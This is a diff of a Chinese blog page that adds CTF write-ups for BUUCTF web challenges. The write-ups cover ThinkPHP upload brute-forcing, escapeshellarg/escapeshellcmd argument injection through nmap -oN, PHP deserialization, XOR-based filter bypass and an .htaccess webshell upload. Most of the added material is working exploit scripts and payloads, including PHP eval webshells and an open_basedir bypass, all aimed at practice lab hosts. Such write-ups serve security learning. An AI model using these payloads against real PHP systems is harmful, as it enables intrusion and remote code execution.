@@ -293,7 +293,7 @@
 	更新于
 	<a href="/2019/10/16/buuctf刷题记录-序/" itemprop="url">
 		<time datetime="2019-10-16T05:26:35.000Z" itemprop="dateUpdated">
-	  		2019-11-10
+	  		2020-01-14
 	  </time>
 	</a> 	
 
@@ -470,7 +470,43 @@ class IndexController extends Controller
 <p>显然是thinkphp写的。<br>namespace显示为： <code>Home\Controller</code>所以说模块名为Home,类名叫IndexController，所以控制器名叫Index。<br>我们上传的文件的函数名叫upload,所以触发器名字叫upload。所以文件上传的url应该为<code>http://434e19a9-9d8a-4603-9f3f-fae4ff5ce6f0.node3.buuoj.cn/Home/Index/upload</code>，但是我们访问之后返回404。然后尝试访问显示index触发器。发现也是404。尝试访问寻找入口文件：<code>http://434e19a9-9d8a-4603-9f3f-fae4ff5ce6f0.node3.buuoj.cn/index.php</code>。访问成功。加上index.php 访问上传路由。发现上传点。尝试传一个其他的模块。<code>http://434e19a9-9d8a-4603-9f3f-fae4ff5ce6f0.node3.buuoj.cn/index.php/aaa</code>发现thinkphp的版本是ThinkPHP3.2.4。</p>
 <p>测试上传文件功能发现。功能正常。能够上传。<br>源码中限制了<code>$_FILES[file]文件名不能是.php文件，得想办法绕过。</code></p>
 <p><code>$upload-&gt;allowExts</code>并不是Think\Upload类的正确用法，所以allowexts后缀名限制是无效的。<br>下载ThinkPHP3.2.4。的源码发现，保存的文件名为uniqid函数生成的，uniqid函数是基于以微秒计的当前时间计算的，两个同时上传生成的文件名相差不会太远。</p>
-<p>加大爆破范围，最后爆破访问php文件成功直接返回flag。</p>
+<p>加大爆破范围，最后爆破访问php文件成功直接返回flag。<br>脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+import time
+
+url = "http://e9eca9a5-67cd-4ee5-9fcb-fc9701e5c789.node3.buuoj.cn/"
+
+path = url + "/index.php/home/index/upload"
+files = {"file":("test.txt",'a'), "file1":("a.php", '&lt;?php eval($_GET["a"]);')}
+r = requests.post(path, files=files)
+t1 = r.text.split("/")[-1].split(".")[0]
+print t1
+print r.content
+t1 = int(t1, 16)
+print t1
+
+j = t1
+while True:
+    path = url + "/Public/Uploads/2019-12-08/%s.php" % hex(j)[2:-1]
+    try:
+        r = requests.get(path, timeout=1)
+        time.sleep(0.5)
+    except:
+        continue
+    while r.status_code == 429:
+        try:
+            r = requests.get(path, timeout=1)
+            time.sleep(0.5)
+        except:
+            continue
+    if r.status_code == 200:
+        print path
+        print r.text
+        break
+    print j, hex(j)[2:-1], r.status_code
+    j -= 1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于buu平台问题，访问过快会返回429，所以脚本有些不一样。</p>
 <h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p><strong>知识点： GET命令漏洞。</strong><br>题目直接给出了源码：</p>
 <pre class="line-numbers language-html"><code class="language-html">&lt;?php 
     $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
@@ -522,7 +558,7 @@ url=file:bash -c /readflag|&amp;filename=alex      //执行命令，把输出写
 http://391babb9-aed6-4d09-b73a-7c09e97707bd.node3.buuoj.cn/sandbox/58d6b1d73392c6051421c6a9a293f985/alex   显示flag。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>在注意buuctf上做这个题。需要知道你对应的内网网关ip,可以通过开启一个linux-labs执行<code>curl -v ctfd_frpc_1</code>来查看。（坑点。。）</p>
-<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><strong>知识点：PHP escapeshellarg()+escapeshellcmd()</strong><br>参考文章：<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p><strong>知识点：PHP escapeshellarg()+escapeshellcmd()导致的参数注入</strong><br>参考文章：<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a><br><a href="https://www.anquanke.com/post/id/168093" target="_blank" rel="noopener">PHP-escapeshell-命令执行</a></p>
 <pre class="line-numbers language-html"><code class="language-html">&lt;?php
 
 if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {    //获取IP
@@ -550,7 +586,234 @@ if(!isset($_GET['host'])) {
 <pre class="line-numbers language-html"><code class="language-html">$host = escapeshellarg($host);   
 $host = escapeshellcmd($host);
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>上一题说到escapeshellarg函数会先对host变量中的单引号进行转义，并且转义之后，在 \’ 的左右两边再加上单引号，变成 ‘\’’。</p>
+<p>上一题说到escapeshellarg函数会先对host变量中的单引号进行转义，并且转义之后，在 \’ 的左右两边再加上单引号，变成 ‘\’’。<br>这里仔细讲一下这两个函数：</p>
+<h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><pre class="line-numbers language-html"><code class="language-html">string escapeshellarg(string $arg)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>转义字符串<code>$arg</code>中的单引号并使用单引号包裹此部分<br>使得<code>$arg</code>只能传递一个参数，且<strong>不能执行不同的命令</strong></p>
+<h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><pre class="line-numbers language-html"><code class="language-html">string escapeshellcmd ( string $command )
+
+转义`&amp; # ; ` | * ? ~ &lt; > ^ ( ) [ ] { } $` 、`x0A`和`xF`，`'`和`"`仅在落单时被转义
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>使得<code>$command</code>只能执行一个命令，但可以传递多个参数。</p>
+<p>写一个例子：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php 
+$param = "172.17.0.2' -v -d a=1";
+$ep = escapeshellarg($param);
+$eep = escapeshellcmd($ep);
+$cmd = "curl ".$eep;
+echo $ep."\n";
+echo $eep."\n";
+echo $cmd."\n";
+system($cmd);
+
+输出结果：
+'172.17.0.2'\'' -v -d a=1'
+'172.17.0.2'\\'' -v -d a=1\'
+curl '172.17.0.2'\\'' -v -d a=1\'
+* Rebuilt URL to: 172.17.0.2\/
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>解释：<br>escapeshellarg会把参数转义为<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，然而escapeshellcmd会发现存在落单的单引号，会再次对单引号进行转义<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>导致了<code>\</code>转义掉，故导致了单引号逃逸。<br>再来分析这个题：<br>nmap -oN选项表示将输出导入到文件中</p>
+<p>看payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">' <span class="token prolog">&lt;?php phpinfo();?></span> -oN shell.php '
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>经过escapeshellarg处理后：</p>
+<pre class="line-numbers language-html"><code class="language-html">''\'' <span class="token prolog">&lt;?php phpinfo();?></span> -oN shell.php '\'''
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>经过escapeshellcmd处理后：</p>
+<pre class="line-numbers language-html"><code class="language-html">''\\'' \<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>\?php</span> <span class="token attr-name">phpinfo\(\)\;\?\</span><span class="token punctuation">></span></span> -oN shell.php '\\'''
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样就成功写入phpinfo了。</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>知识点：<strong>反序列化，php伪协议</strong></p>
+<p>题目直接给出源码：</p>
+<pre class="line-numbers language-html"><code class="language-html"> <span class="token prolog">&lt;?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="welcome to the zjctf")){第一关
+    echo "&lt;br>&lt;h1>".file_get_contents($text,'r')."&lt;/h1>&lt;/br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个题不难，第一关通过<code>php://input</code>伪协议，通过post传入<code>welcome to the zjctf</code>来控制变量text的值，<br>然后通过<code>php://filter/read=convert.base64-encode/resource=useless.php</code>来读取文件。</p>
+<pre class="line-numbers language-html"><code class="language-html">class Flag{  //flag.php  
+    public $file;
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+} 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后我们包含这个文件，用password的反序列化来读flag,这里有个坑点，就是他return的不是个flag，我们需要抓包来读。<br>payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">/?text=php://input&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
+
+post：
+welcome to the zjctf
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>知识点：<strong>php特性，绕过open_basedir</strong><br>题目直接给出了源码：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)>18){
+    die('One inch long, one inch strong!');
+}
+
+if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i', $hhh) )
+    die('Try something else!');
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)>12) die("Almost there!");
+
+eval($hhh);
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个题分两关，第一部分是，绕过滤来执行<code>get_the_flag</code>函数。<br>首先，限制了长度小于等于18位，然后限制了字符种类。<br><code>count_chars</code>函数，参数 “mode 3” 会返回包含所有用过的不同字符的字符串。这里限制无们使用字符的种类不能超过12中。<br>思路：通过字符异或得到我们想要的字符<br>首先，我们需要通过fuzz获取到没有被过滤的字符，然后进行异或得到，我们想要的。<br>fuzz脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+
+for ($ascii = 0; $ascii &lt; 256; $ascii++) {
+    if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i', chr($ascii))) {
+        echo bin2hex(chr($ascii));
+        echo "\n";
+    }
+}
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后，因为限制字符的长度，所以考虑字符长度问题，我们异或得到<code>_GET</code>最短，进行异或。<br>这里需要知道的奇淫技巧：</p>
+<pre class="line-numbers language-html"><code class="language-html">1.代码中没有引号的字符都自动作为字符串。
+Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。
+2.Ascii码大于 0x7F 的字符都会被当作字符串
+3.php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型
+4.PHP中的的大括号(花括号{})使用详解
+$str{4}在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理
+例：${_GET}{cmd}
+5.字符串可以用!操作符来进行布尔类型的转换
+&lt;?php
+var_dump(@a);   //string(1) "a"
+var_dump(!@a);  //bool(false)
+var_dump(!!@a); //bool(true)
+6.PHP的弱类型特性
+因为要获取'和'{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是('>'>'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>')+('</span><span class="token punctuation">></span></span>'>'&lt;')==2
+7.a-zA-Z使用自增变成下一个字母
+'a'++ => 'b'
+'b'++ => 'c'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据以上内容先进行异或。<br>异或脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+import requests
+import urllib
+
+l=[] #白名单
+b=[] #黑名单
+url='http://localhost/buuctf/suctf2019.php'
+for x in range(0,256):
+    # print urllib.quote(chr(x))
+    url1=url+'?_='+urllib.quote(chr(x))
+    # print url1
+    data=requests.get(url1)
+    if 'Try something else!' not in data.text:
+        # print urllib.quote(chr(x))
+        l.append(chr(x))
+    else:
+        b.append(chr(x))
+def yihuo(str1,whitelist,blacklist):
+    a1=[] 
+    a2=[] 
+    data='\''
+    for j in str1:
+        for h in whitelist:
+            if ord(h)&lt;=177: # 跳过\x7f前的字符
+                continue
+            res=chr(ord(j)^ord(h))
+            if res not in blacklist:
+                a1.append(urllib.quote(res))
+                a2.append(urllib.quote(h))
+                print 'succcess!--------'+j
+                break
+            if h == whitelist[-1]:
+                print 'error！-----------'+j
+    for n in a1:
+        data+=n
+    data+='\'^\''
+    for m in a2:
+        data+=m
+    data+='\''
+    return data
+
+print yihuo('_GET',l,b)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到<code>_GET</code>,即<code>&#39;%ED%F5%F7%E6&#39;^&#39;%B2%B2%B2%B2&#39;</code>。因为大于\x7f的字符默认是字符串类型，所以可以省去单引号。之后是构造执行函数：</p>
+<pre class="line-numbers language-html"><code class="language-html">${%ED%F5%F7%E6^%B2%B2%B2%B2}{%ED}();&amp;%ED=phpinfo
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>直接执行phpinfo,我们发现存在disable_functions。<br>没办法直接执行命令。只能通过执行<code>get_the_flag</code>函数。</p>
+<p>再来看<code>get_the_flag</code>函数，<br>过滤了后缀含有ph的文件，并且过滤了<code>&lt;?</code>，这里用到了。htaccess文件和base64编码。来绕过过滤。<br>上传脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+import base64
+
+url = "http://383c8fe1-feeb-4469-9e91-710d263e4bd3.node3.buuoj.cn/?_=${%ED%F5%F7%E6^%B2%B2%B2%B2}{%ED}();&amp;%ED=get_the_flag"
+
+
+htaccess = b"""\x00\x00\x8a\x39\x8a\x39
+AddType application/x-httpd-php .cc
+php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/shell.cc"
+
+"""
+
+shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<span class="token prolog">&lt;?php eval($_POST['c']);?></span>")
+#shell = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ b"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>php<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>"
+
+files = [('file',('.htaccess',htaccess,'image/jpeg'))]
+
+data = {"upload":"Submit"}
+
+proxies = {"http":"http://127.0.0.1:8080"}
+r = requests.post(url=url, data=data, files=files)#proxies=proxies)
+print(r.text) 
+
+
+files = [('file',('shell.cc',shell,'image/jpeg'))]
+r = requests.post(url=url, data=data, files=files)
+print(r.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上传成功获得webshell。这里可以用<code>bypass open_basedir</code>的新方法.<br>payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>原理请参考：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">bypass open_basedir的新方法</a><br>如果php版本是php5的话可以尝试这个：<a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a><br>但是这个题考的其实是 利用PHP-FPM绕过disable_functions<br>参考：<a href="https://www.mi1k7ea.com/2019/08/03/%E4%BB%8E%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%9C%8B%E5%88%A9%E7%94%A8PHP-FPM%E7%BB%95%E8%BF%87disable-functions/" target="_blank" rel="noopener">从蚁剑插件看利用PHP-FPM绕过disable_functions</a><br><a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">PHP连接方式和攻击PHP-FPM＆* CTF echohub WP</a></p>
 	
 	</div>
 	
@@ -588,6 +851,39 @@ $host = escapeshellcmd($host);
 
 <div class="relate-post">
 	<ul>
+		
+				<li>
+					<div>
+						<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" title="i春秋2020新春战“疫”网络安全公益赛 web Writeup">
+							i春秋2020新春战“疫”网络安全公益赛 web Writeup
+						</a>
+						<p>
+							前言这次比赛题目质量挺好的，除啦环境可能有时候有点问题。（就让我遇到了。心态炸了一天。。。）其他都挺好的。
+DAY1简单的招聘系统知识点：sql注入的联合注入或盲注存在注册和登陆功能，首先进行注册后登陆进系统，发现有一个模块是管理员才...
+						</p>
+					</div>
+
+					<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" title="i春秋2020新春战“疫”网络安全公益赛 web Writeup">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="i春秋2020新春战“疫”网络安全公益赛 web Writeup">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" title="2019安洵杯+2019广外比赛web部分题解">
+							2019安洵杯+2019广外比赛web部分题解
+						</a>
+						<p>
+							2019安洵杯easy_web知识点：MD5强碰撞，命令执行这个题比较简单，看题目发现传入参数img和cmd，然而图片是传入的img参数控制，让我想到ddctf的一道题，然后发现img是通过把文件名进行转十六进制后两次base64编码...
+						</p>
+					</div>
+
+					<a href="/2019/12/01/2019安洵杯-2019广外比赛web部分题解/" title="2019安洵杯+2019广外比赛web部分题解">				
+						<img src="/images/post-cover/37.jpg" class="relateImg" alt="2019安洵杯+2019广外比赛web部分题解">
+					</a>
+				</li>											
+		
 		
 				<li>
 					<div>
@@ -729,43 +1025,6 @@ web1 &lt;?php
 
 					<a href="/2019/04/30/2019ddctfwriteup/" title="2019ddctfwriteup">				
 						<img src="/images/post-cover/25.jpg" class="relateImg" alt="2019ddctfwriteup">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">
-							2019西湖论剑杯writeup
-						</a>
-						<p>
-							web部分babyt3首先，访问进去发现有提示：
-开始测试：get方式传参file=index.php发现无限加载。说明可以加载php文件，尝试读取源码。使用php协议php://filter/read=convert.base64-...
-						</p>
-					</div>
-
-					<a href="/2019/04/11/2019西湖论剑杯writeup/" title="2019西湖论剑杯writeup">				
-						<img src="/images/post-cover/22.jpg" class="relateImg" alt="2019西湖论剑杯writeup">
-					</a>
-				</li>											
-		
-		
-				<li>
-					<div>
-						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
-							2019掘安杯writeup
-						</a>
-						<p>
-							web部分下载下载与以前见到bugku的题差不多。
-提示：flag.php
-然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
-&lt;?php
-header('Content-...
-						</p>
-					</div>
-
-					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
-						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
 					</a>
 				</li>											
 		
@@ -1047,7 +1306,7 @@ header('Content-...
 	<div class="copyright">
 		<p>
 			 
-				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+				&copy;2017 - 2020, content by Alex. All Rights Reserved.
 			
 			
 			
